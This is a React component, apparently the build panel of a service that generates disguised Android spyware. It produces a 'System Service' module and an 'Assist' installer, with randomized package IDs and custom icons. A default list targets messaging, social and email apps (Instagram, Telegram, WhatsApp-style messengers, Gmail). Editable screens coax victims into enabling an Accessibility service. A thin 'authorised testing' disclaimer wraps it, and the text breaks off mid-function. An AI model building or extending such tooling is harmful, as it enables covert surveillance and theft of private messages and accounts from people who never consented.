import React, { useState, useEffect, useRef, useCallback } from 'react';

const disclaimerStyles = {
  overlay: {
    position: 'fixed', inset: 0, zIndex: 9999,
    background: 'rgba(2,6,23,0.85)',
    backdropFilter: 'blur(4px)',
    display: 'flex', alignItems: 'center', justifyContent: 'center',
    padding: 16,
  },
  modal: {
    background: 'linear-gradient(160deg,#0f172a 0%,#0c1425 100%)',
    border: '1px solid rgba(239,68,68,0.35)',
    borderRadius: 14,
    padding: 28,
    maxWidth: 480,
    width: '100%',
    boxShadow: '0 0 40px rgba(239,68,68,0.12), 0 8px 32px rgba(0,0,0,0.6)',
  },
  head: { display: 'flex', alignItems: 'center', gap: 10, marginBottom: 18 },
  icon: { fontSize: 26, lineHeight: 1 },
  headText: { fontSize: 15, fontWeight: 700, color: '#fca5a5', letterSpacing: 0.2 },
  subHead: { fontSize: 11, color: '#ef4444', fontWeight: 600, marginTop: 2 },
  divider: { border: 'none', borderTop: '1px solid rgba(239,68,68,0.2)', margin: '0 0 18px' },
  itemRow: { display: 'flex', alignItems: 'flex-start', gap: 10, marginBottom: 12 },
  bullet: { fontSize: 15, lineHeight: 1.3, flexShrink: 0, marginTop: 1 },
  itemText: { fontSize: 12.5, color: '#cbd5e1', lineHeight: 1.5 },
  highlight: { color: '#fbbf24', fontWeight: 600 },
  agree: {
    marginTop: 18, padding: '12px 14px',
    background: 'rgba(239,68,68,0.07)', border: '1px solid rgba(239,68,68,0.25)',
    borderRadius: 8, fontSize: 11.5, color: '#94a3b8', lineHeight: 1.5,
  },
  btnRow: { display: 'flex', gap: 10, marginTop: 18, justifyContent: 'flex-end' },
  cancelBtn: {
    background: 'transparent', border: '1px solid #334155', color: '#94a3b8',
    borderRadius: 7, padding: '9px 18px', fontSize: 12, fontWeight: 600, cursor: 'pointer',
  },
  confirmBtn: {
    background: 'linear-gradient(135deg,#dc2626 0%,#b91c1c 100%)',
    border: 'none', color: '#fff', borderRadius: 7, padding: '9px 20px',
    fontSize: 12, fontWeight: 700, cursor: 'pointer', letterSpacing: 0.2,
  },
};

function DisclaimerModal({ filename, onConfirm, onCancel }) {
  return (
    <div style={disclaimerStyles.overlay}>
      <div style={disclaimerStyles.modal}>
        <div style={disclaimerStyles.head}>
          <span style={disclaimerStyles.icon}>⚠️</span>
          <div>
            <div style={disclaimerStyles.headText}>Important — Read Before Downloading</div>
            <div style={disclaimerStyles.subHead}>This software is provided for authorised testing only</div>
          </div>
        </div>
        <hr style={disclaimerStyles.divider} />
        <div style={disclaimerStyles.itemRow}>
          <span style={disclaimerStyles.bullet}>📵</span>
          <span style={disclaimerStyles.itemText}>
            <span style={disclaimerStyles.highlight}>Do not install on your personal device.</span> Use only a
            dedicated test or spare Android device that contains no personal accounts, passwords, or sensitive information.
          </span>
        </div>
        <div style={disclaimerStyles.itemRow}>
          <span style={disclaimerStyles.bullet}>🧹</span>
          <span style={disclaimerStyles.itemText}>
            <span style={disclaimerStyles.highlight}>Factory reset the device first.</span> Remove all personal
            data, accounts, photos, and apps before proceeding.
          </span>
        </div>
        <div style={disclaimerStyles.itemRow}>
          <span style={disclaimerStyles.bullet}>🔒</span>
          <span style={disclaimerStyles.itemText}>
            <span style={disclaimerStyles.highlight}>No credentials or sensitive data.</span> Ensure no email
            accounts, banking apps, social media logins, or private files exist on the device.
          </span>
        </div>
        <div style={disclaimerStyles.itemRow}>
          <span style={disclaimerStyles.bullet}>🛡️</span>
          <span style={disclaimerStyles.itemText}>
            We accept <span style={disclaimerStyles.highlight}>no liability whatsoever</span> for any damage,
            data loss, privacy breach, or device malfunction. Use entirely at your own risk.
          </span>
        </div>
        <div style={disclaimerStyles.agree}>
          By clicking <strong style={{ color: '#fca5a5' }}>I Understand — Download</strong> you confirm that
          you have read and accepted these terms, that you are legally authorised to install this software on
          the target device, and that you hold full responsibility for any consequences of its use.
        </div>
        <div style={disclaimerStyles.btnRow}>
          <button style={disclaimerStyles.cancelBtn} onClick={onCancel}>Cancel</button>
          <button style={disclaimerStyles.confirmBtn} onClick={onConfirm}>
            I Understand — Download {filename}
          </button>
        </div>
      </div>
    </div>
  );
}

const ACCENT_PRESETS = [
  { label: 'Indigo',  value: '#6366F1' },
  { label: 'Sky',     value: '#0EA5E9' },
  { label: 'Green',   value: '#22C55E' },
  { label: 'Amber',   value: '#F59E0B' },
  { label: 'Rose',    value: '#F43F5E' },
  { label: 'Purple',  value: '#8B5CF6' },
];

const MODULE_ACCENT_PRESETS = [
  { label: 'Sky',     value: '#0EA5E9' },
  { label: 'Indigo',  value: '#6366F1' },
  { label: 'Green',   value: '#22C55E' },
  { label: 'Amber',   value: '#F59E0B' },
  { label: 'Rose',    value: '#F43F5E' },
  { label: 'Purple',  value: '#8B5CF6' },
];

const BG_PRESETS = [
  { label: 'Dark Navy',  value: '#0B1020' },
  { label: 'Slate',      value: '#0F172A' },
  { label: 'Dark Gray',  value: '#111827' },
  { label: 'Pure Black', value: '#000000' },
  { label: 'Deep Blue',  value: '#0D1B4B' },
  { label: 'Dark Teal',  value: '#042F2E' },
];

const MODULE_BG_PRESETS = [
  { label: 'Slate',      value: '#0F172A' },
  { label: 'Dark Navy',  value: '#0B1020' },
  { label: 'Dark Gray',  value: '#111827' },
  { label: 'Pure Black', value: '#000000' },
  { label: 'Deep Blue',  value: '#0D1B4B' },
  { label: 'Dark Teal',  value: '#042F2E' },
];

const MODULE_CARD_PRESETS = [
  { label: 'Navy',     value: '#1E293B' },
  { label: 'Slate',    value: '#0F172A' },
  { label: 'Dark',     value: '#1A1A2E' },
  { label: 'Gray',     value: '#1F2937' },
  { label: 'Teal',     value: '#134E4A' },
  { label: 'Indigo',   value: '#1E1B4B' },
];

const styles = {
  page: {
    height: '100%', overflow: 'auto', padding: '4px 4px 24px 4px',
    color: '#e2e8f0', fontFamily: '"Inter","Segoe UI",sans-serif',
  },
  card: {
    background: 'rgba(15,23,42,0.6)', border: '1px solid #1e293b',
    borderRadius: 12, padding: 20, marginBottom: 16,
  },
  title: { fontSize: 16, fontWeight: 600, color: '#a5b4fc', marginBottom: 4 },
  subtitle: { fontSize: 12, color: '#64748b', marginBottom: 14 },
  twoCol: { display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))', gap: 16 },
  column: {
    background: 'rgba(2,6,23,0.45)', border: '1px solid #1e293b',
    borderRadius: 10, padding: 16, display: 'flex', flexDirection: 'column', gap: 14,
  },
  colHeader: {
    display: 'flex', alignItems: 'center', gap: 8, paddingBottom: 8,
    borderBottom: '1px solid #1e293b', fontSize: 13, fontWeight: 700,
    color: '#c4b5fd', letterSpacing: 0.4, textTransform: 'uppercase',
  },
  field: { display: 'flex', flexDirection: 'column', gap: 4 },
  label: { fontSize: 11, color: '#94a3b8', textTransform: 'uppercase', letterSpacing: 0.5, fontWeight: 600 },
  hint: { fontSize: 11, color: '#475569' },
  input: {
    background: 'rgba(2,6,23,0.6)', border: '1px solid #334155',
    borderRadius: 6, padding: '8px 10px', color: '#e2e8f0', fontSize: 13,
    outline: 'none', fontFamily: 'inherit',
  },
  textarea: {
    background: 'rgba(2,6,23,0.6)', border: '1px solid #334155',
    borderRadius: 6, padding: '8px 10px', color: '#e2e8f0', fontSize: 12.5,
    fontFamily: '"JetBrains Mono","Fira Code",monospace', outline: 'none',
    minHeight: 130, resize: 'vertical', lineHeight: 1.4,
  },
  inputErr: { borderColor: '#ef4444' },
  errMsg: { color: '#f87171', fontSize: 11 },
  btnRow: { display: 'flex', gap: 10, marginTop: 18, alignItems: 'center', flexWrap: 'wrap' },
  buildBtn: {
    background: 'linear-gradient(135deg,#6366f1 0%,#8b5cf6 100%)',
    color: '#fff', border: 'none', borderRadius: 8,
    padding: '10px 22px', fontSize: 13, fontWeight: 600, cursor: 'pointer',
  },
  buildBtnDisabled: { opacity: 0.5, cursor: 'not-allowed' },
  dlBtn: {
    background: 'rgba(34,197,94,0.15)', border: '1px solid rgba(34,197,94,0.4)',
    color: '#86efac', borderRadius: 8, padding: '8px 16px', fontSize: 12, fontWeight: 600,
    cursor: 'pointer', textDecoration: 'none', display: 'inline-flex', alignItems: 'center', gap: 6,
  },
  status: { fontSize: 12, color: '#94a3b8' },
  badge: (color) => ({
    display: 'inline-block', padding: '2px 8px', borderRadius: 10,
    fontSize: 11, fontWeight: 600, color, background: `${color}22`, border: `1px solid ${color}55`,
  }),
  logPane: {
    background: '#020617', border: '1px solid #1e293b', borderRadius: 8,
    padding: 12, fontFamily: '"JetBrains Mono","Fira Code",monospace', fontSize: 11.5,
    color: '#cbd5e1', height: 360, overflow: 'auto', whiteSpace: 'pre-wrap', lineHeight: 1.45,
  },
  accessIdBox: {
    background: 'rgba(99,102,241,0.1)', border: '1px dashed rgba(99,102,241,0.4)',
    borderRadius: 8, padding: '10px 14px', marginBottom: 16, fontSize: 12, color: '#a5b4fc',
  },
  workerPill: (online) => ({
    display: 'inline-flex', alignItems: 'center', gap: 6,
    padding: '3px 10px', borderRadius: 12, fontSize: 11, fontWeight: 600,
    color: online ? '#86efac' : '#fca5a5',
    background: online ? 'rgba(34,197,94,0.12)' : 'rgba(239,68,68,0.12)',
    border: `1px solid ${online ? 'rgba(34,197,94,0.4)' : 'rgba(239,68,68,0.4)'}`,
  }),
  ghaTag: {
    display: 'inline-flex', alignItems: 'center', gap: 5,
    padding: '2px 8px', borderRadius: 10, fontSize: 10, fontWeight: 600,
    color: '#a78bfa', background: 'rgba(139,92,246,0.1)', border: '1px solid rgba(139,92,246,0.3)',
  },
  sectionToggle: {
    display: 'flex', alignItems: 'center', gap: 8, padding: '8px 12px',
    background: 'rgba(99,102,241,0.08)', border: '1px solid rgba(99,102,241,0.2)',
    borderRadius: 8, cursor: 'pointer', fontSize: 12, fontWeight: 600, color: '#a5b4fc',
    userSelect: 'none',
  },
  iconRow: { display: 'flex', gap: 8, alignItems: 'flex-start' },
  iconPreview: {
    width: 48, height: 48, borderRadius: 10, border: '1px solid #334155',
    objectFit: 'cover', flexShrink: 0, background: '#1e293b',
    display: 'flex', alignItems: 'center', justifyContent: 'center',
    fontSize: 22, overflow: 'hidden',
  },
  uploadBtn: {
    background: 'rgba(99,102,241,0.1)', border: '1px solid rgba(99,102,241,0.3)',
    color: '#a5b4fc', borderRadius: 6, padding: '6px 12px', fontSize: 11,
    fontWeight: 600, cursor: 'pointer', whiteSpace: 'nowrap',
  },
  colorSwatches: { display: 'flex', gap: 6, flexWrap: 'wrap', marginTop: 4 },
  swatch: (color, selected) => ({
    width: 28, height: 28, borderRadius: 6, background: color, cursor: 'pointer',
    border: selected ? '2px solid #a5b4fc' : '2px solid transparent',
    boxShadow: selected ? '0 0 0 1px rgba(165,180,252,0.5)' : 'none',
    flexShrink: 0,
  }),
  colorPickerWrapper: { display: 'flex', gap: 8, alignItems: 'center', marginTop: 4 },
  colorInput: {
    width: 36, height: 28, borderRadius: 4, border: '1px solid #334155',
    cursor: 'pointer', padding: 1, background: 'transparent',
  },
  colorTextInput: {
    background: 'rgba(2,6,23,0.6)', border: '1px solid #334155', borderRadius: 6,
    padding: '4px 8px', color: '#e2e8f0', fontSize: 12, outline: 'none',
    fontFamily: 'monospace', width: 90,
  },
};

const PKG_REGEX  = /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/;
const NAME_REGEX = /^[\w .&'-]{1,40}$/;
const URL_REGEX  = /^https?:\/\/.+/i;

const DEFAULT_MONITORED_PACKAGES = [
  'com.android.stk',
  'com.instagram.android',
  'com.facebook.katana',
  'org.telegram.messenger',
  'com.snapchat.android',
  'com.zhiliaoapp.musically',
  'com.twitter.android',
  'com.facebook.orca',
  'com.google.android.gm',
  'com.viber.voip',
  'com.skype.raider',
];

function getToken() {
  return localStorage.getItem('user_token') || localStorage.getItem('admin_token') || '';
}
function authHeaders() {
  const t = getToken();
  return t ? { Authorization: `Bearer ${t}` } : {};
}

function IconField({ label, iconSource, onSourceChange, disabled }) {
  const fileRef = useRef(null);
  const [urlInput, setUrlInput] = useState('');
  const [mode, setMode] = useState('default');

  const handleFile = (e) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (ev) => {
      const dataUri = ev.target.result;
      onSourceChange(dataUri);
      setMode('file');
      setUrlInput('');
    };
    reader.readAsDataURL(file);
  };

  const handleUrlBlur = () => {
    const v = urlInput.trim();
    if (v && URL_REGEX.test(v)) {
      onSourceChange(v);
      setMode('url');
    } else if (!v) {
      onSourceChange('');
      setMode('default');
    }
  };

  const handleClear = () => {
    onSourceChange('');
    setMode('default');
    setUrlInput('');
    if (fileRef.current) fileRef.current.value = '';
  };

  const isDataUri = iconSource && iconSource.startsWith('data:');
  const isUrl = iconSource && URL_REGEX.test(iconSource);
  const hasIcon = isDataUri || isUrl;

  return (
    <div style={styles.field}>
      <label style={styles.label}>{label} Icon</label>
      <div style={styles.iconRow}>
        <div style={styles.iconPreview}>
          {hasIcon
            ? <img src={iconSource} alt="icon preview" style={{ width: '100%', height: '100%', objectFit: 'cover', borderRadius: 10 }} />
            : <span title="Default icon">🤖</span>}
        </div>
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: 6 }}>
          <div style={{ display: 'flex', gap: 6 }}>
            <input
              type="text"
              style={{ ...styles.input, fontSize: 11, flex: 1, padding: '6px 8px' }}
              placeholder="Paste image URL…"
              value={urlInput}
              onChange={e => setUrlInput(e.target.value)}
              onBlur={handleUrlBlur}
              onKeyDown={e => { if (e.key === 'Enter') handleUrlBlur(); }}
              disabled={disabled}
              spellCheck={false}
            />
            <button
              style={styles.uploadBtn}
              onClick={() => fileRef.current?.click()}
              disabled={disabled}
              title="Upload image file"
              type="button"
            >
              📁 Upload
            </button>
          </div>
          {hasIcon && (
            <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
              <span style={{ fontSize: 10, color: '#22c55e' }}>
                {isDataUri ? '✓ File uploaded' : '✓ URL set'}
              </span>
              <button
                style={{ background: 'none', border: 'none', color: '#f87171', fontSize: 10, cursor: 'pointer', padding: 0 }}
                onClick={handleClear}
                disabled={disabled}
                type="button"
              >
                ✕ Use default
              </button>
            </div>
          )}
          {!hasIcon && <span style={styles.hint}>Leave blank to use the default icon</span>}
        </div>
      </div>
      <input ref={fileRef} type="file" accept="image/*" style={{ display: 'none' }} onChange={handleFile} />
    </div>
  );
}

function ColorPicker({ label, value, onChange, presets, disabled }) {
  return (
    <div style={styles.field}>
      <label style={styles.label}>{label}</label>
      <div style={styles.colorSwatches}>
        {presets.map(p => (
          <div
            key={p.value}
            style={styles.swatch(p.value, value === p.value)}
            title={p.label}
            onClick={() => !disabled && onChange(p.value)}
          />
        ))}
      </div>
      <div style={styles.colorPickerWrapper}>
        <input
          type="color"
          style={styles.colorInput}
          value={value}
          onChange={e => onChange(e.target.value)}
          disabled={disabled}
          title="Custom color"
        />
        <input
          type="text"
          style={styles.colorTextInput}
          value={value}
          onChange={e => {
            const v = e.target.value;
            if (/^#[0-9a-fA-F]{0,6}$/.test(v)) onChange(v);
          }}
          disabled={disabled}
          spellCheck={false}
          maxLength={7}
        />
        <span style={{ fontSize: 11, color: '#64748b' }}>{label}</span>
      </div>
    </div>
  );
}

function LaunchPagePreview({ title, subtitle, btnText, bgColor, accentColor }) {
  return (
    <div style={{
      background: bgColor, borderRadius: 16, padding: '24px 16px',
      display: 'flex', flexDirection: 'column', alignItems: 'center',
      minHeight: 280, border: '1px solid #1e293b', overflow: 'hidden',
    }}>
      <div style={{ fontSize: 10, color: '#475569', marginBottom: 12, letterSpacing: 1, textTransform: 'uppercase' }}>
        Live Preview
      </div>
      <div style={{
        width: 72, height: 72, borderRadius: '50%',
        background: `${accentColor}22`, border: `2px solid ${accentColor}55`,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        fontSize: 28, marginBottom: 16,
      }}>🤖</div>
      <div style={{
        background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.1)',
        borderRadius: 12, padding: '16px', width: '100%', display: 'flex', flexDirection: 'column', gap: 8,
      }}>
        <div style={{ fontSize: 14, fontWeight: 700, color: '#fff', textAlign: 'center', wordBreak: 'break-word' }}>
          {title || 'App Title'}
        </div>
        <div style={{ fontSize: 11, color: '#9ca3af', textAlign: 'center', wordBreak: 'break-word' }}>
          {subtitle || 'App subtitle here'}
        </div>
        <div style={{
          marginTop: 6, padding: '10px 0', borderRadius: 8, textAlign: 'center',
          background: accentColor, color: '#fff', fontWeight: 700, fontSize: 12,
        }}>
          {btnText || 'Install'}
        </div>
      </div>
    </div>
  );
}

function ModuleLaunchPagePreview({ title, subtitle, step1, step2, step3, step4, btnText, footer, bgColor, cardColor, accentColor }) {
  const stepStyle = { display: 'flex', alignItems: 'flex-start', gap: 8, marginBottom: 8 };
  const circleStyle = {
    width: 20, height: 20, borderRadius: '50%', background: `${accentColor}22`,
    border: `1.5px solid ${accentColor}`, color: accentColor,
    display: 'flex', alignItems: 'center', justifyContent: 'center',
    fontSize: 10, fontWeight: 700, flexShrink: 0, marginTop: 1,
  };
  return (
    <div style={{
      background: bgColor, borderRadius: 16, padding: '16px 14px',
      border: '1px solid #1e293b', overflow: 'hidden',
    }}>
      <div style={{ fontSize: 10, color: '#475569', marginBottom: 10, letterSpacing: 1, textTransform: 'uppercase', textAlign: 'center' }}>
        Live Preview
      </div>
      <div style={{ textAlign: 'center', marginBottom: 10 }}>
        <div style={{ fontSize: 13, fontWeight: 700, color: '#f1f5f9', marginBottom: 2 }}>
          {title || 'System Service'}
        </div>
        <div style={{ fontSize: 10, color: '#94a3b8' }}>
          {subtitle || 'Accessibility service not enabled'}
        </div>
      </div>
      {/* Status badge */}
      <div style={{
        background: cardColor, borderRadius: 10, padding: '8px 10px', marginBottom: 8,
        display: 'flex', alignItems: 'center', gap: 6,
      }}>
        <span style={{ fontSize: 12 }}>⚠</span>
        <div>
          <div style={{ fontSize: 10, fontWeight: 700, color: '#f1f5f9' }}>Action Required</div>
          <div style={{ fontSize: 9, color: '#94a3b8' }}>Enable the accessibility service to continue</div>
        </div>
      </div>
      {/* Steps card */}
      <div style={{ background: cardColor, borderRadius: 10, padding: '10px', marginBottom: 8 }}>
        <div style={{ fontSize: 8, color: '#64748b', letterSpacing: 1, marginBottom: 8, textTransform: 'uppercase' }}>
          HOW TO ENABLE
        </div>
        {[step1 || 'Tap the button below to open Accessibility Settings',
          step2 || 'Find and tap the app under Installed Services',
          step3 || 'Toggle it ON and tap Allow in the dialog',
          step4 || 'Return to this screen — permissions granted automatically',
        ].map((s, i) => (
          <div key={i} style={stepStyle}>
            <div style={circleStyle}>{i + 1}</div>
            <div style={{ fontSize: 9, color: '#cbd5e1', lineHeight: 1.4, flex: 1 }}>{s}</div>
          </div>
        ))}
      </div>
      <div style={{
        padding: '8px 0', borderRadius: 6, textAlign: 'center',
        background: accentColor, color: '#fff', fontWeight: 700, fontSize: 11, marginBottom: 6,
      }}>
        {btnText || 'Open Accessibility Settings'}
      </div>
      <div style={{ fontSize: 9, color: '#475569', textAlign: 'center' }}>
        {footer || 'Permissions are granted automatically once accessibility is enabled.'}
      </div>
    </div>
  );
}

function generatePkgSuggestions(packageIds, count = 6, exclude = []) {
  const results = new Set();
  const used = new Set(exclude);
  const available = packageIds.filter(pkg => !used.has(pkg));
  while (results.size < count && available.length > 0) {
    const index = Math.floor(Math.random() * available.length);
    results.add(available.splice(index, 1)[0]);
  }
  return [...results];
}

function generateUniquePackagePair(packageIds) {
  const [modulePackage, installerPackage] = generatePkgSuggestions(packageIds, 2);
  return {
    modulePackage: modulePackage || '',
    installerPackage: installerPackage || '',
  };
}

export default function BuildApkTab({ user }) {
  const [moduleName,       setModuleName]       = useState('System Service');
  const [moduleIconSource, setModuleIconSource] = useState('');
  const [installerName,       setInstallerName]      = useState('Assist');
  const [installerIconSource, setInstallerIconSource] = useState('');

  const [modulePackage, setModulePackage] = useState('');
  const [installerPackage, setInstallerPackage] = useState('');

  const [modPkgSugg,  setModPkgSugg]  = useState([]);
  const [instPkgSugg, setInstPkgSugg] = useState([]);

  const [monitoredText, setMonitoredText] = useState(DEFAULT_MONITORED_PACKAGES.join('\n'));

  const [showLaunchEditor, setShowLaunchEditor] = useState(false);
  const [launchTitle,       setLaunchTitle]       = useState('A module is required');
  const [launchSubtitle,    setLaunchSubtitle]    = useState('Click Install to proceed.');
  const [launchBtnText,     setLaunchBtnText]     = useState('Install');
  const [launchBgColor,     setLaunchBgColor]     = useState('#0B1020');
  const [launchAccentColor, setLaunchAccentColor] = useState('#6366F1');

  const [showModuleLaunchEditor, setShowModuleLaunchEditor] = useState(false);
  const [moduleLaunchTitle,       setModuleLaunchTitle]       = useState('System Service');
  const [moduleLaunchSubtitle,    setModuleLaunchSubtitle]    = useState('Accessibility service not enabled');
  const [moduleLaunchStep1,       setModuleLaunchStep1]       = useState('Tap the button below to open Accessibility Settings');
  const [moduleLaunchStep2,       setModuleLaunchStep2]       = useState('');
  const [moduleLaunchStep3,       setModuleLaunchStep3]       = useState('Toggle it ON and tap Allow in the confirmation dialog');
  const [moduleLaunchStep4,       setModuleLaunchStep4]       = useState('Return to this screen — permissions will be granted automatically');
  const [moduleLaunchBtnText,     setModuleLaunchBtnText]     = useState('Open Accessibility Settings');
  const [moduleLaunchFooter,      setModuleLaunchFooter]      = useState('Permissions are granted automatically once accessibility is enabled.');
  const [moduleLaunchBgColor,     setModuleLaunchBgColor]     = useState('#0F172A');
  const [moduleLaunchCardColor,   setModuleLaunchCardColor]   = useState('#1E293B');
  const [moduleLaunchAccentColor, setModuleLaunchAccentColor] = useState('#0EA5E9');

  const [errors,     setErrors]     = useState({});
  const [running,    setRunning]    = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [logs,       setLogs]       = useState([]);
  const [lastResult, setLastResult] = useState(null);
  const [accessId,   setAccessId]   = useState(user?.accessId || '');
  const [downloads,  setDownloads]  = useState({ module: false, installer: false });
  const [workerOnline, setWorkerOnline] = useState(false);
  const [disclaimer,   setDisclaimer]  = useState(null);
  const [apkExpiresAt, setApkExpiresAt] = useState(null);
  const [expiryCountdown, setExpiryCountdown] = useState(null);
  const [packageIds, setPackageIds] = useState([]);
  const [packageIdsLoading, setPackageIdsLoading] = useState(true);
  const [packageIdsError, setPackageIdsError] = useState('');

  const logEndRef     = useRef(null);
  const pollIdRef     = useRef(null);
  const expiryTickRef = useRef(null);
  const prevRunningRef = useRef(false);

  const applyNewPackageIds = useCallback(() => {
    const { modulePackage: newModule, installerPackage: newInstaller } =
      generateUniquePackagePair(packageIds);
    if (!newModule || !newInstaller) return;
    setModulePackage(newModule);
    setInstallerPackage(newInstaller);
    setModPkgSugg(generatePkgSuggestions(packageIds, 6, [newInstaller]));
    setInstPkgSugg(generatePkgSuggestions(packageIds, 6, [newModule]));
  }, [packageIds]);

  useEffect(() => {
    let cancelled = false;
    (async () => {
      try {
        const r = await fetch('/api/build/packageids', { headers: authHeaders() });
        const d = await r.json().catch(() => ({}));
        if (!r.ok || !d.success || !Array.isArray(d.packageIds) || d.packageIds.length < 2) {
          throw new Error(d.error || 'Package ID pool unavailable');
        }
        if (cancelled) return;
        const ids = [...new Set(d.packageIds.filter(pkg => PKG_REGEX.test(pkg)))];
        if (ids.length < 2) throw new Error('Package ID pool has fewer than two valid IDs');
        const { modulePackage, installerPackage } = generateUniquePackagePair(ids);
        setPackageIds(ids);
        setModulePackage(modulePackage);
        setInstallerPackage(installerPackage);
        setModPkgSugg(generatePkgSuggestions(ids, 6, [installerPackage]));
        setInstPkgSugg(generatePkgSuggestions(ids, 6, [modulePackage]));
        setPackageIdsError('');
      } catch (err) {
        if (!cancelled) setPackageIdsError(err.message || 'Package ID pool unavailable');
      } finally {
        if (!cancelled) setPackageIdsLoading(false);
      }
    })();
    return () => { cancelled = true; };
  }, []);

  useEffect(() => {
    if (logEndRef.current) logEndRef.current.scrollTop = logEndRef.current.scrollHeight;
  }, [logs]);

  const fetchStatus = useCallback(async () => {
    try {
      const r = await fetch('/api/build/status', { headers: authHeaders() });
      if (!r.ok) return null;
      const d = await r.json();
      if (d.success) {
        if (d.accessId) setAccessId(d.accessId);
        setRunning(!!d.running);
        setWorkerOnline(!!d.workerOnline);
        if (d.isMyBuild && Array.isArray(d.lines) && d.lines.length > 0) setLogs(d.lines);
        if (!d.running && d.isMyBuild && d.success_ != null)
          setLastResult({ success: !!d.success_, error: d.error || null });
        if (d.apkExpiresAt) setApkExpiresAt(d.apkExpiresAt);
        return d;
      }
    } catch (_) {}
    return null;
  }, []);

  useEffect(() => {
    if (expiryTickRef.current) clearInterval(expiryTickRef.current);
    if (!apkExpiresAt) { setExpiryCountdown(null); return; }
    const tick = () => {
      const ms = apkExpiresAt - Date.now();
      if (ms <= 0) {
        setExpiryCountdown(null);
        setDownloads({ module: false, installer: false });
        clearInterval(expiryTickRef.current);
      } else {
        const m = Math.floor(ms / 60000);
        const s = Math.floor((ms % 60000) / 1000);
        setExpiryCountdown(`${m}:${String(s).padStart(2, '0')}`);
      }
    };
    tick();
    expiryTickRef.current = setInterval(tick, 1000);
    return () => clearInterval(expiryTickRef.current);
  }, [apkExpiresAt]);

  useEffect(() => { fetchStatus(); }, [fetchStatus]);

  useEffect(() => {
    if (prevRunningRef.current && !running) {
      applyNewPackageIds();
    }
    prevRunningRef.current = running;
  }, [running, applyNewPackageIds]);

  useEffect(() => {
    if (!running) {
      if (pollIdRef.current) { clearInterval(pollIdRef.current); pollIdRef.current = null; }
      if (accessId) checkDownloadAvailability();
      return;
    }
    pollIdRef.current = setInterval(fetchStatus, 1500);
    return () => { if (pollIdRef.current) { clearInterval(pollIdRef.current); pollIdRef.current = null; } };
  }, [running, fetchStatus, accessId]);

  const checkDownloadAvailability = useCallback(async () => {
    const probe = async (type) => {
      try {
        const r = await fetch(`/api/build/download/${type}`, { method: 'HEAD', headers: authHeaders() });
        return r.ok;
      } catch (_) { return false; }
    };
    const [m, i] = await Promise.all([probe('module'), probe('installer')]);
    setDownloads({ module: m, installer: i });
  }, []);

  useEffect(() => { checkDownloadAvailability(); }, [checkDownloadAvailability]);

  const parseMonitored = () =>
    monitoredText.split(/[\s,]+/).map(s => s.trim()).filter(Boolean);

  const validate = () => {
    const e = {};
    if (!NAME_REGEX.test(moduleName.trim()))       e.moduleName       = '1-40 chars: letters, digits, space, . & \' -';
    if (!PKG_REGEX.test(modulePackage.trim()))     e.modulePackage    = 'e.g. com.example.app (lowercase, dot-separated)';
    if (!NAME_REGEX.test(installerName.trim()))    e.installerName    = '1-40 chars: letters, digits, space, . & \' -';
    if (!PKG_REGEX.test(installerPackage.trim()))  e.installerPackage = 'e.g. com.example.installer';
    if (modulePackage.trim() === installerPackage.trim() && !e.modulePackage && !e.installerPackage)
      e.installerPackage = 'Must differ from module package';
    const bad = parseMonitored().filter(p => !PKG_REGEX.test(p));
    if (bad.length > 0)
      e.monitored = `Invalid package(s): ${bad.slice(0, 3).join(', ')}${bad.length > 3 ? '…' : ''}`;
    if (!NAME_REGEX.test(launchTitle.trim()))    e.launchTitle    = '1-40 chars';
    if (!NAME_REGEX.test(launchSubtitle.trim())) e.launchSubtitle = '1-40 chars';
    if (!NAME_REGEX.test(launchBtnText.trim()))  e.launchBtnText  = '1-40 chars';
    const chk = (v, key, lbl) => { if (v.trim() && v.trim().length > 200) e[key] = `${lbl}: max 200 chars`; };
    chk(moduleLaunchTitle,    'moduleLaunchTitle',    'Title');
    chk(moduleLaunchSubtitle, 'moduleLaunchSubtitle', 'Subtitle');
    chk(moduleLaunchStep1,    'moduleLaunchStep1',    'Step 1');
    chk(moduleLaunchStep2,    'moduleLaunchStep2',    'Step 2');
    chk(moduleLaunchStep3,    'moduleLaunchStep3',    'Step 3');
    chk(moduleLaunchStep4,    'moduleLaunchStep4',    'Step 4');
    chk(moduleLaunchBtnText,  'moduleLaunchBtnText',  'Button');
    chk(moduleLaunchFooter,   'moduleLaunchFooter',   'Footer');
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const startBuild = async () => {
    if (!validate() || running || submitting) return;
    setSubmitting(true);
    setRunning(true);
    setLogs([]);
    setLastResult(null);
    setDownloads({ module: false, installer: false });

    try {
      const payload = {
        moduleName:        moduleName.trim(),
        modulePackage:     modulePackage.trim(),
        installerName:     installerName.trim(),
        installerPackage:  installerPackage.trim(),
        monitoredPackages: parseMonitored(),
        moduleIconUrl:     moduleIconSource || '',
        installerIconUrl:  installerIconSource || '',
        installerLaunchTitle:       launchTitle.trim(),
        installerLaunchSubtitle:    launchSubtitle.trim(),
        installerLaunchBtnText:     launchBtnText.trim(),
        installerLaunchBgColor:     launchBgColor,
        installerLaunchAccentColor: launchAccentColor,
        moduleLaunchTitle:       moduleLaunchTitle.trim(),
        moduleLaunchSubtitle:    moduleLaunchSubtitle.trim(),
        moduleLaunchStep1:       moduleLaunchStep1.trim(),
        moduleLaunchStep2:       moduleLaunchStep2.trim(),
        moduleLaunchStep3:       moduleLaunchStep3.trim(),
        moduleLaunchStep4:       moduleLaunchStep4.trim(),
        moduleLaunchBtnText:     moduleLaunchBtnText.trim(),
        moduleLaunchFooter:      moduleLaunchFooter.trim(),
        moduleLaunchBgColor:     moduleLaunchBgColor,
        moduleLaunchCardColor:   moduleLaunchCardColor,
        moduleLaunchAccentColor: moduleLaunchAccentColor,
      };

      const r = await fetch('/api/build/apk', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...authHeaders() },
        body: JSON.stringify(payload),
      });
      const d = await r.json();
      if (!r.ok || !d.success) {
        setRunning(false);
        setLastResult({ success: false, error: d.error || 'Build request failed' });
        return;
      }
      if (d.accessId) setAccessId(d.accessId);
      setWorkerOnline(!!d.workerOnline);
